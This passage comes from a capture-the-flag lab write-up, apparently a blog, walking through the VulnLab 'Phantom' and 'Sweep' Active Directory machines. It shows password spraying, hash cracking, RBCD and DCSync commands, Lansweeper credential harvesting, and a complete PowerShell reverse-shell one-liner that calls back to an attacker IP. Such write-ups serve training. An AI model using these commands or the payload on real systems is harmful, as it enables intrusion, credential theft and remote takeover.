PHANTOM\SSPR Service (SidTypeGroup) What I learned most about this part is that even though the RID is not *SidTypeUser* I should also add this to my wordlists for bruteforcing methods to be used. I'll filter this out and get only the usernames. bash cat tmp | cut -d '\' -f2 | awk '{print $1}' | tee users.txt cat users.txt Administrator svc_sspr TechSupports Server ICT DevOps HRManagers rnichols pharrison wsilva elynch nhamilton lstanley bbarnes ... I can then try to spray if there are accounts that uses their usernames as password. bash nxc smb phantom.vl -u users.txt -p users.txt --continue-on-success --no-bruteforce SMB 10.10.123.78 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) ... SMB 10.10.123.78 445 DC [+] phantom.vl\TechSupports:TechSupports (Guest) SMB 10.10.123.78 445 DC [+] phantom.vl\Server:Server (Guest) SMB 10.10.123.78 445 DC [+] phantom.vl\ICT:ICT (Guest) SMB 10.10.123.78 445 DC [+] phantom.vl\DevOps:DevOps (Guest) SMB 10.10.123.78 445 DC [+] phantom.vl\HRManagers:HRManagers (Guest) ... SMB 10.10.123.78 445 DC [+] phantom.vl\SSPR:SSPR (Guest) They’re all positive using the `nxc` tool, and they are just Guest accounts. I'll access the share that I saw earlier in SMB bash smbclient.py PHANTOM/guest@phantom.vl -no-pass Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation Type help for list of commands # use Public # ls drw-rw-rw- 0 Thu Jul 11 11:03:14 2024 . drw-rw-rw- 0 Sun Jul 7 04:39:30 2024 .. -rw-rw-rw- 14565 Sat Jul 6 12:09:28 2024 tech_support_email.eml # get tech_support_email.eml There is an email file inside it, once I download it and view it using an online email viewer. I can see its content. ## Password Spray Since I got a hint of the password, I'll try to spray this password to the users I got earlier. bash nxc smb phantom.vl -u users.txt -p '' --continue-on-success SMB 10.10.123.78 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) ... SMB 10.10.123.78 445 DC [+] phantom.vl\ibryant: ... I got a hit with the user *ibryant* I'll see if theses has any access to SMB shares. bash nxc smb phantom.vl -u ibryant -p '' --shares SMB 10.10.123.78 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) SMB 10.10.123.78 445 DC [+] phantom.vl\ibryant: SMB 10.10.123.78 445 DC [*] Enumerated shares SMB 10.10.123.78 445 DC Share Permissions Remark SMB 10.10.123.78 445 DC ----- ----------- ------ SMB 10.10.123.78 445 DC ADMIN$ Remote Admin SMB 10.10.123.78 445 DC C$ Default share SMB 10.10.123.78 445 DC Departments Share READ SMB 10.10.123.78 445 DC IPC$ READ Remote IPC SMB 10.10.123.78 445 DC NETLOGON READ Logon server share SMB 10.10.123.78 445 DC Public READ SMB 10.10.123.78 445 DC SYSVOL READ Logon server share The user *ibryant* has access to `Departments Share` this is a good thing. I can also use the **spider_plus** module from netexec to automatically crawl the SMB share. bash nxc smb phantom.vl -u ibryant -p '' -M spider_plus SMB 10.10.123.78 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) SMB 10.10.123.78 445 DC [+] phantom.vl\ibryant: SPIDER_PLUS 10.10.123.78 445 DC [*] Started module spidering_plus with the following options: SPIDER_PLUS 10.10.123.78 445 DC [*] DOWNLOAD_FLAG: False SPIDER_PLUS 10.10.123.78 445 DC [*] STATS_FLAG: True SPIDER_PLUS 10.10.123.78 445 DC [*] EXCLUDE_FILTER: ['print$', 'ipc$'] SPIDER_PLUS 10.10.123.78 445 DC [*] EXCLUDE_EXTS: ['ico', 'lnk'] SPIDER_PLUS 10.10.123.78 445 DC [*] MAX_FILE_SIZE: 50 KB SPIDER_PLUS 10.10.123.78 445 DC [*] OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus SMB 10.10.123.78 445 DC [*] Enumerated shares SMB 10.10.123.78 445 DC Share Permissions Remark SMB 10.10.123.78 445 DC ----- ----------- ------ SMB 10.10.123.78 445 DC ADMIN$ Remote Admin SMB 10.10.123.78 445 DC C$ Default share SMB 10.10.123.78 445 DC Departments Share READ SMB 10.10.123.78 445 DC IPC$ READ Remote IPC SMB 10.10.123.78 445 DC NETLOGON READ Logon server share SMB 10.10.123.78 445 DC Public READ SMB 10.10.123.78 445 DC SYSVOL READ Logon server share SPIDER_PLUS 10.10.123.78 445 DC [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.10.123.78.json". SPIDER_PLUS 10.10.123.78 445 DC [*] SMB Shares: 7 (ADMIN$, C$, Departments Share, IPC$, NETLOGON, Public, SYSVOL) SPIDER_PLUS 10.10.123.78 445 DC [*] SMB Readable Shares: 5 (Departments Share, IPC$, NETLOGON, Public, SYSVOL) SPIDER_PLUS 10.10.123.78 445 DC [*] SMB Filtered Shares: 1 SPIDER_PLUS 10.10.123.78 445 DC [*] Total folders found: 23 SPIDER_PLUS 10.10.123.78 445 DC [*] Total files found: 19 SPIDER_PLUS 10.10.123.78 445 DC [*] File size average: 13.56 MB SPIDER_PLUS 10.10.123.78 445 DC [*] File size min: 22 B SPIDER_PLUS 10.10.123.78 445 DC [*] File size max: 82.48 MB In NetExec's JSON output, I find a VeraCrypt-related folder on the share and download the relevant files. The listing is shown below. bash ... "IT/Backup/IT_BACKUP_201123.hc": { "atime_epoch": "2024-07-06 14:04:14", "ctime_epoch": "2024-07-06 14:04:14", "mtime_epoch": "2024-07-06 14:04:34", "size": "12 MB" } ... Veracrypt installer bash ... "IT/veracrypt-1.26.7-Ubuntu-22.04-amd64.deb": { "atime_epoch": "2024-07-11 10:59:06", "ctime_epoch": "2024-07-11 10:59:02", "mtime_epoch": "2024-07-11 10:59:06", "size": "8.77 MB" } ... ## Cracking I need to crack the password of this veracrypt folder. As a hint from wiki.vulnlabs.com it says > Should you need to crack a hash, use a short custom wordlist based on company name & simple mutation rules commonly seen in real life passwords (e.g. year & a special character). > I can make a rule out of this when cracking. It says company name so it’s phantom, so I just need combinations. bash phantom Phantom Ph4ntom Ph4nt0m Now I just need the year & a special character bash $2 $0 $2 $3 $! $2 $0 $2 $3 $@ $2 $0 $2 $3 $# $2 $0 $2 $3 $$ $2 $0 $2 $3 $% $2 $0 $2 $3 $^ $2 $0 $2 $3 $& $2 $0 $2 $3 $* $2 $0 $2 $3 $( $2 $0 $2 $3 $) $2 $0 $2 $3 $- $2 $0 $2 $3 $= $2 $0 $2 $3 $+ Now I can crack the veracrypt file by passing it to the hashcat directly bash hashcat -m 13722 -a 0 IT_BACKUP_201123.hc wordlist.txt Or an alternative making a backup bash dd if=./IT_BACKUP_201123.hc of=./hash bs=512 count=1 1+0 records in 1+0 records out 512 bytes copied, 0.000130223 s, 3.9 MB/s hashcat -m 13722 -a 0 hash wordlist.txt Once cracked, I can go to its directory and look at its backup and logs. bash backup ls '$RECYCLE.BIN' azure_vms_1023.json splunk_logs_1003 'System Volume Information' azure_vms_1104.json splunk_logs_1102 another-backup azure_vms_1123.json ticketing_system_backup.zip azure_vms_0805.json splunk_logs1203 vyos_backup.tar.gz ## User A trick here is to do a recursive grep for a keyword I need. If I do a grep for “password” nothing happens. A `tar.gz` file exist, I can extract it and do a recursive grep with the keyword “password” in that `grep -r "password /path/directory"` bash vyos_backup grep -iR password ... "username": {"lstanley": {"password": ""}}},"mode": "local"},"client-ip-pool": {"SSTP-POOL": {"range": "10.0.0.2-10.0.0.100"}},"default-pool": "SSTP-POOL","gateway-address": "10.0.0.1","ssl": {"ca-certificate": "CA","certificate": "Server"}}}} ... I find credentials associated with `lstanley` and test the recovered password against the enumerated domain users. bash nxc smb phantom.vl -u users.txt -p --continue-on-success SMB 10.10.123.78 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) .. SMB 10.10.123.78 445 DC [+] phantom.vl\svc_sspr: ... I got a hit on user `svc_sspr` I'll check if this account can remote access. bash nxc winrm phantom.vl -u svc_sspr -p WINRM 10.10.123.78 5985 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl) WINRM 10.10.123.78 5985 DC [+] phantom.vl\svc_sspr: (Pwn3d!) It says pwned I can use `evil-winrm` with it. bash evil-winrm -i phantom.vl -u svc_sspr -p Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\svc_sspr\Documents> cd ..\desktop ## SYSTEM I'll enumerate things with bloodhound bash nxc ldap 10.10.123.78 -u 'svc_sspr' -p '' --bloodhound --dns-server 10.10.123.78 -c All SMB 10.10.123.78 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) LDAP 10.10.123.78 389 DC [+] phantom.vl\svc_sspr: LDAP 10.10.123.78 389 DC Resolved collection methods: acl, psremote, group, dcom, localadmin, session, rdp, objectprops, trusts, container LDAP 10.10.123.78 389 DC Done in 00M 24S LDAP 10.10.123.78 389 DC Compressing output into /home/serioton/.nxc/logs/DC_10.10.123.78_2024-07-13_121218_bloodhound.zip After ingesting the data in bloodhound. I can see the the user `svc_sspr` has an outbound object control Jackpot! this user has `forceChangePassword` permission to three users. I can choose any of the three users that `svc_sspr` can change password to. I'll use the user `wsilva` to escalate my privilege. bash bloodyAD --host DC.phantom.vl -d phantom.vl -u 'svc_sspr' -p '' set password 'wsilva' 'P@ssw0rd123' I now successfully changed the password of the user wsilva. ## SPN-less RBCD If I try to dig deeper with bloodhound, the user `wsilva` has `AddAllowedToAct` to the domain controller. This calls for **Resource-Based Constrained Delegation (RBCD)**. In order for RBCD attack to work, the attacker needs to populate the target attribute with the SID of an account that Kerberos can consider as a service. A service ticket will be asked for it. In short, the account must be either: - a user account having a ServicePrincipalName set - an account with a trailing $ in the sAMAccountName (i.e. a computer accounts) - any other account and conduct SPN-less RBCD with U2U (User-to-User) authentication The common way to conduct these attacks is to create a computer account. This is usually possible thanks to a domain-level attribute called `MachineAccountQuota` that allows regular users to create up to 10 computer accounts. Using the `maq` module in `nxc` I can enumerate if the account has the `MachineAccountQuota` bash nxc ldap phantom.vl -u svc_sspr -p '' -M maq SMB 10.10.123.78 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) LDAP 10.10.123.78 389 DC [+] phantom.vl\svc_sspr: MAQ 10.10.123.78 389 DC [*] Getting the MachineAccountQuota MAQ 10.10.123.78 389 DC MachineAccountQuota: 0 The `MachineAccountQuota` is 0, this isn’t the dead-end. I can do an RBCD with a twist with this SPN-less RBCD attack from this article. https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html This article also provides an excellent explanation about SPN-less RBCD https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users. The first step is to do the normal method of RBCD bash rbcd.py -delegate-from 'wsilva' -delegate-to 'DC$' -dc-ip '10.10.123.78' -action 'write' 'phantom.vl'/'wsilva':'P@ssw0rd' Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty [*] Delegation rights modified successfully! [*] wsilva can now impersonate users on DC$ via S4U2Proxy [*] Accounts allowed to act on behalf of other identity: [*] wsilva (S-1-5-21-4029599044-1972224926-2225194048-1114) Then I need to obtain a TGT through overpass-the-hash to use RC4 bash getTGT.py -hashes :$(pypykatz crypto nt 'P@ssw0rd') 'phantom.vl'/'wsilva' Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Saving ticket in wsilva.ccache I select the resulting credential cache: bash export KRB5CCNAME=wsilva.ccache Then I'll obtain the TGT session key bash describeTicket.py wsilva.ccache | grep 'Ticket Session Key' [*] Ticket Session Key : e826a54fce399da484eae4b39c3bc72a Then I'll change the user wsilva’s NT hash with the TGT session key bash smbpasswd.py -newhashes :e826a54fce399da484eae4b39c3bc72a 'phantom.vl'/'wsilva':'P@ssw0rd'@'DC.phantom.vl' Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] NTLM hashes were changed successfully. The last step is to obtain the delegated service ticket through **S4U2self+U2U**, followed by **S4U2proxy** bash getST.py -k -no-pass -u2u -impersonate "Administrator" -spn "cifs/DC.phantom.vl" 'phantom.vl'/'wsilva' Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Impersonating Administrator [*] Requesting S4U2self+U2U [*] Requesting S4U2Proxy [*] Saving ticket in Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache As I can see, I successfully got a ticket for the administrator user. At this stage, I can perform a DCSync: bash nxc smb DC.phantom.vl --use-kcache --ntds [!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user to dump a specific user safely or the module -M ntdsutil [Y/n] Y SMB 10.10.123.78 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) SMB 10.10.123.78 445 DC [+] phantom.vl\Administrator from ccache (Pwn3d!) SMB 10.10.123.78 445 DC [+] Dumping the NTDS, this could take a while so go grab a redbull... SMB 10.10.123.78 445 DC Administrator:500:aad3b435b51404eeaad3b435b51404ee:::: ... Obtained the administrator hash bash nxc winrm phantom.vl -u administrator -H WINRM 10.10.123.78 5985 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl) WINRM 10.10.123.78 5985 DC [+] phantom.vl\administrator: (Pwn3d!) I connect with `evil-winrm` and retrieve the root flag. bash evil-winrm -i phantom.vl -u administrator -H Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\desktop *Evil-WinRM* PS C:\Users\Administrator\desktop> ls Directory: C:\Users\Administrator\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 7/4/2024 7:22 AM 2308 Microsoft Edge.lnk -a---- 7/6/2024 11:57 AM 36 root.txt

items.title: Sweep
items.content: # Sweep Platform: VulnLab Difficulty: medium OS: Windows Category: Active Directory Tags: Lansweeper, Credential Harvesting, BloodHound, GenericAll Date: 2026-06-30 This machine from **Vulnlab** is all about exploiting **Lansweeper** an IT discovery and inventory platform. It starts from a weak password from an `intern` account, faked an SSH to scan with so that the plain text password of `svc_inventory_lnx` will be revealed. Added itself to the **Remote Access Servers** group. Then, deployed a reverse shell from **Lansweeper**. ## Scanning bash Nmap scan report for 10.10.101.163 Host is up (0.29s latency). Not shown: 984 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 81/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | http-title: Lansweeper - Login |_Requested resource was /login.aspx 82/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | ssl-cert: Subject: commonName=Lansweeper Secure Website | Subject Alternative Name: DNS:localhost, DNS:localhost, DNS:localhost | Not valid before: 2021-11-21T09:22:27 |_Not valid after: 2121-12-21T09:22:27 | tls-alpn: |_ http/1.1 | http-title: Lansweeper - Login |_Requested resource was /login.aspx |_ssl-date: TLS randomness does not represent time 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-10-06 08:06:20Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sweep.vl0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sweep.vl0., Site: Default-First-Site-Name) 3269/tcp open globalcatLDAPssl? 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2025-10-06T08:07:31+00:00; -2s from scanner time. | ssl-cert: Subject: commonName=inventory.sweep.vl | Not valid before: 2025-10-05T08:03:40 |_Not valid after: 2026-04-06T08:03:40 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Service Unavailable 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Service Info: Host: INVENTORY; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-10-06T08:06:56 |_ start_date: N/A |_clock-skew: mean: -2s, deviation: 0s, median: -2s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required ## Enumeration Since I noticed that LDAP is open. I need to check for null authentication bash # Query for namingContexts ldapsearch -H ldap://10.10.101.163 -x -s base namingContexts dn: namingContexts: DC=sweep,DC=vl namingContexts: CN=Configuration,DC=sweep,DC=vl namingContexts: CN=Schema,CN=Configuration,DC=sweep,DC=vl namingContexts: DC=DomainDnsZones,DC=sweep,DC=vl namingContexts: DC=ForestDnsZones,DC=sweep,DC=vl # We can know the name of Domain Controller with ldapsearch -H ldap://10.10.101.163 -x -s base dnsHostName dn: dnsHostName: inventory.sweep.vl # We can also use nmap with this script sudo nmap --script=ldap-rootdse 10.10.101.163 -vv I now know that the domain name is **sweep.vl** and the domain controller is **inventory.sweep.vl**. I add this in `/etc/hosts` at the format ` sweep.vl inventory.sweep.vl` During the **nmap** scan, I notice there’s port 81 bash 81/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | http-title: Lansweeper - Login |_Requested resource was /login.aspx Visiting it took me to the login page of **Lansweeper** but I don’t have credentials. So I check for null authentications. When checking for null authentication with `netexec` I get a `STATUS_ACCESS_DENIED` because `netexec` enumerates shares with authentication. But `smbclient` is different bash # netexec netexec smb 10.10.101.163 -u '' -p '' --shares SMB 10.10.101.163 445 INVENTORY [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:False) SMB 10.10.101.163 445 INVENTORY [+] sweep.vl\: SMB 10.10.101.163 445 INVENTORY [-] Error enumerating shares: STATUS_ACCESS_DENIED # smbclient smbclient -N -L //10.10.101.163 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share DefaultPackageShare$ Disk Lansweeper PackageShare IPC$ IPC Remote IPC Lansweeper$ Disk Lansweeper Actions NETLOGON Disk Logon server share SYSVOL Disk Logon server share Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.101.163 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available I now know that there are these shares existing. But with a null authentication I don’t have access with this. So I try to enumerate built in account with least privilege, which is **guest**. bash netexec smb 10.10.101.163 -u guest -p '' --shares SMB 10.10.101.163 445 INVENTORY [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:False) SMB 10.10.101.163 445 INVENTORY [+] sweep.vl\guest: SMB 10.10.101.163 445 INVENTORY [*] Enumerated shares SMB 10.10.101.163 445 INVENTORY Share Permissions Remark SMB 10.10.101.163 445 INVENTORY ----- ----------- ------ SMB 10.10.101.163 445 INVENTORY ADMIN$ Remote Admin SMB 10.10.101.163 445 INVENTORY C$ Default share SMB 10.10.101.163 445 INVENTORY DefaultPackageShare$ READ Lansweeper PackageShare SMB 10.10.101.163 445 INVENTORY IPC$ READ Remote IPC SMB 10.10.101.163 445 INVENTORY Lansweeper$ Lansweeper Actions SMB 10.10.101.163 445 INVENTORY NETLOGON Logon server share SMB 10.10.101.163 445 INVENTORY SYSVOL Logon server share The guest was enabled, I can use this to go deeper within the shares. I have read access to `IPC$` but further reconnaissance led to a rabbit hole. But with this **guest** account, I can use this to lookup for SID and enumerate users. bash lookupsid.py guest@10.10.101.163 -no-pass [*] Brute forcing SIDs at 10.10.101.163 [*] StringBinding ncacn_np:10.10.101.163[\pipe\lsarpc] [*] Domain SID is: S-1-5-21-4292653625-3348997472-4156797480 498: SWEEP\Enterprise Read-only Domain Controllers (SidTypeGroup) 500: SWEEP\Administrator (SidTypeUser) 501: SWEEP\Guest (SidTypeUser) 502: SWEEP\krbtgt (SidTypeUser) 512: SWEEP\Domain Admins (SidTypeGroup) 513: SWEEP\Domain Users (SidTypeGroup) 514: SWEEP\Domain Guests (SidTypeGroup) 515: SWEEP\Domain Computers (SidTypeGroup) 516: SWEEP\Domain Controllers (SidTypeGroup) 517: SWEEP\Cert Publishers (SidTypeAlias) 518: SWEEP\Schema Admins (SidTypeGroup) 519: SWEEP\Enterprise Admins (SidTypeGroup) 520: SWEEP\Group Policy Creator Owners (SidTypeGroup) 521: SWEEP\Read-only Domain Controllers (SidTypeGroup) 522: SWEEP\Cloneable Domain Controllers (SidTypeGroup) 525: SWEEP\Protected Users (SidTypeGroup) 526: SWEEP\Key Admins (SidTypeGroup) 527: SWEEP\Enterprise Key Admins (SidTypeGroup) 553: SWEEP\RAS and IAS Servers (SidTypeAlias) 571: SWEEP\Allowed RODC Password Replication Group (SidTypeAlias) 572: SWEEP\Denied RODC Password Replication Group (SidTypeAlias) 1000: SWEEP\INVENTORY$ (SidTypeUser) 1101: SWEEP\DnsAdmins (SidTypeAlias) 1102: SWEEP\DnsUpdateProxy (SidTypeGroup) 1103: SWEEP\Lansweeper Admins (SidTypeGroup) 1113: SWEEP\jgre808 (SidTypeUser) 1114: SWEEP\bcla614 (SidTypeUser) 1115: SWEEP\hmar648 (SidTypeUser) 1116: SWEEP\jgar931 (SidTypeUser) 1117: SWEEP\fcla801 (SidTypeUser) 1118: SWEEP\jwil197 (SidTypeUser) 1119: SWEEP\grob171 (SidTypeUser) 1120: SWEEP\fdav736 (SidTypeUser) 1121: SWEEP\jsmi791 (SidTypeUser) 1122: SWEEP\hjoh690 (SidTypeUser) 1123: SWEEP\svc_inventory_win (SidTypeUser) 1124: SWEEP\svc_inventory_lnx (SidTypeUser) 1125: SWEEP\intern (SidTypeUser) 3101: SWEEP\Lansweeper Discovery (SidTypeGroup) One user is interesting here, and it’s `intern` after doing a verification with `netexec` all failed without a password. But a hint from **wiki.vulnlabs.com** > Sometimes you have to hit yourself > So I tried `intern:intern` and it worked bash netexec smb sweep.vl -u intern -p intern SMB 10.10.75.23 445 INVENTORY [*] Windows Server 2022 Build 20348 x64 (name:INVENTORY) (domain:sweep.vl) (signing:True) (SMBv1:False) SMB 10.10.75.23 445 INVENTORY [+] sweep.vl\intern:intern ## User Now I remembered there’s a login page in **Lansweeper** so I logged in with the account `intern` After a bunch of time doing reconnaissance, there’s an interesting section which is at *Scanning - Scanning credentials* and under credentials, I can see that there’s a saved credential for the user `svc_inventory_lnx`. Another account also is `svc_inventory_win`. For me to verify if these accounts are worth it, I run a `rusthound` scan to map and enumerate attack vectors. bash rusthound -d 'sweep.vl' -f 'inventory.sweep.vl' -u 'intern' -p 'intern' -n 10.10.101.163 -z --------------------------------------------------- Initializing RustHound at 05:14:10 on 10/06/25 Powered by g0h4n from OpenCyber --------------------------------------------------- [2025-10-06T09:14:10Z INFO rusthound] Verbosity level: Info [2025-10-06T09:14:10Z INFO rusthound::ldap] Connected to SWEEP.VL Active Directory! [2025-10-06T09:14:10Z INFO rusthound::ldap] Starting data collection... [2025-10-06T09:14:12Z INFO rusthound::ldap] All data collected for NamingContext DC=sweep,DC=vl [2025-10-06T09:14:12Z INFO rusthound::json::parser] Starting the LDAP objects parsing... [2025-10-06T09:14:12Z INFO rusthound::json::parser::bh_41] MachineAccountQuota: 10 [2025-10-06T09:14:12Z INFO rusthound::json::parser] Parsing LDAP objects finished! [2025-10-06T09:14:12Z INFO rusthound::json::checker] Starting checker to replace some values... [2025-10-06T09:14:12Z INFO rusthound::json::checker] Checking and replacing some values finished! [2025-10-06T09:14:12Z INFO rusthound::json::maker] 17 users parsed! [2025-10-06T09:14:12Z INFO rusthound::json::maker] 62 groups parsed! [2025-10-06T09:14:12Z INFO rusthound::json::maker] 1 computers parsed! [2025-10-06T09:14:12Z INFO rusthound::json::maker] 3 ous parsed! [2025-10-06T09:14:12Z INFO rusthound::json::maker] 1 domains parsed! [2025-10-06T09:14:12Z INFO rusthound::json::maker] 2 gpos parsed! [2025-10-06T09:14:12Z INFO rusthound::json::maker] 21 containers parsed! [2025-10-06T09:14:12Z INFO rusthound::json::maker] .//20251006051412_sweep-vl_rusthound.zip created! RustHound Enumeration Completed at 05:14:12 on 10/06/25! Happy Graphing! I just need to ingest in bloodhound. And found that `svc_inventory_lnx` account is worth it. To recover the password for `svc_inventory_lnx`, I configure Lansweeper to scan my host while a fake SSH service records the authentication attempt. I use the following tool: https://github.com/fffaraz/fakessh bash go install github.com/fffaraz/fakessh@latest sudo setcap 'cap_net_bind_service=+ep' ~/go/bin/fakessh fakessh [optional-log-directory] In **Scanning → Scanning targets**, I add an IP-range target and set both endpoints to my VPN address. With my fake SSH service running, I save the target and click **Scan now** to capture the authentication attempt on port 22. If no credentials appear in the terminal after the scan, I check the fake SSH service's log. Now that I have `svc_inventory_lnx`'s password, I just need to get remote access. Looking at the bloodhound graph above, the group that `svc_inventory_lnx` is a member of has `GenericAll` permission to **LANDSWEEPER ADMINS**, its member here is `JGRE808` where the **LANDSWEEPER ADMINS** group is also a member of **REMOTE MANAGEMENT USERS** group. So what I'll do here is just add `svc_inventory_lnx` to the group **LANDSWEEPER ADMINS**. bash bloodyAD -d sweep.vl -u svc_inventory_lnx -p '' --host 10.10.75.23 add groupMember 'LANSWEEPER ADMINS' svc_inventory_lnx Now I can use `evil-winrm` after adding `svc_inventory_lnx` to the group **LANDSWEEPER ADMINS**. bash evil-winrm -i sweep.vl -u 'svc_inventory_lnx' -p '' Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\svc_inventory_lnx\Documents> ## SYSTEM To escalate the privilege, I need to go back to **Lansweeper,** and login as `svc_inventory_lnx`. To skip to the part, after countless enumeration, I found something interesting. At *Configuration → User access & roles* and under *user roles*, I found out that `SWEEP\Lansweeper Admins` is under **Inventory Administrator**, and the permissions has **Access scanning credentials** and **Access deployments** In **Scanning → Scanning credentials → Credential mapping**, I select **Map credentials**, choose **Windows Computer**, and map `sweep/inventory` to the Windows inventory credential. I create a package under **Deployment → Deployment packages**. I add a step with **Action** set to **Command** and use a PowerShell reverse-shell payload. I can generate the payload at: https://www.revshells.com/ bash powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.8.7.143',4455);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" On my machine, I start a listener for the reverse shell. bash rlwrap nc -lvnp 4455 I click **Deploy now**, choose **Selection**, and select **INVENTORY** as the target asset. I execute the deployment and receive a shell running as `NT AUTHORITY\SYSTEM`.
